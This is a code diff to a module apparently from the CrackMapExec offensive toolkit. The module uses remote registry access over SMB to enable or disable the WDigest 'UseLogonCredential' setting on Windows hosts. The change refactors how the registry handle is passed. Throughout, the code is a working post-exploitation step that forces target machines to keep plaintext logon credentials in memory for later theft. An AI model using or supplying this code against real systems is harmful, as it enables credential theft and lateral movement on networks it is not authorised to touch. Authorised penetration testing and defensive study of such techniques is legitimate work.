@@ -35,18 +35,17 @@ class CMEModule:
     def wdigest_enable(self, context, smbconnection):
         remoteOps = RemoteOperations(smbconnection, False)
         remoteOps.enableRegistry()
-        rrp = remoteOps._RemoteOperations__rrp
 
-        if rrp is not None:
-            ans = rrp.hOpenLocalMachine(rrp)
+        if remoteOps._RemoteOperations__rrp:
+            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
 
-            ans = rrp.hBaseRegOpenKey(rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
             keyHandle = ans['phkResult']
 
-            rrp.hBaseRegSetValue(rrp, keyHandle, 'UseLogonCredential\x00',  rrp.REG_DWORD, 1)
+            rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00',  rrp.REG_DWORD, 1)
 
-            rtype, data = rrp.hBaseRegQueryValue(rrp, keyHandle, 'UseLogonCredential\x00')
+            rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
 
             if int(data) == 1:
                 context.log.success('UseLogonCredential registry key created successfully')
@@ -59,17 +58,16 @@ class CMEModule:
     def wdigest_disable(self, context, smbconnection):
         remoteOps = RemoteOperations(smbconnection, False)
         remoteOps.enableRegistry()
-        rrp = remoteOps._RemoteOperations__rrp
 
-        if rrp is not None:
-            ans = rrp.hOpenLocalMachine(rrp)
+        if remoteOps._RemoteOperations__rrp:
+            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
             regHandle = ans['phKey']
 
-            ans = rrp.hBaseRegOpenKey(rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
+            ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest')
             keyHandle = ans['phkResult']
 
             try:
-                rrp.hBaseRegDeleteValue(rrp, keyHandle, 'UseLogonCredential\x00')
+                rrp.hBaseRegDeleteValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
             except:
                 context.log.success('UseLogonCredential registry key not present')
 
@@ -82,7 +80,7 @@ class CMEModule:
 
             try:
                 #Check to make sure the reg key is actually deleted
-                rtype, data = rrp.hBaseRegQueryValue(rrp, keyHandle, 'UseLogonCredential\x00')
+                rtype, data = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'UseLogonCredential\x00')
             except DCERPCException:
                 context.log.success('UseLogonCredential registry key deleted successfully')
                 
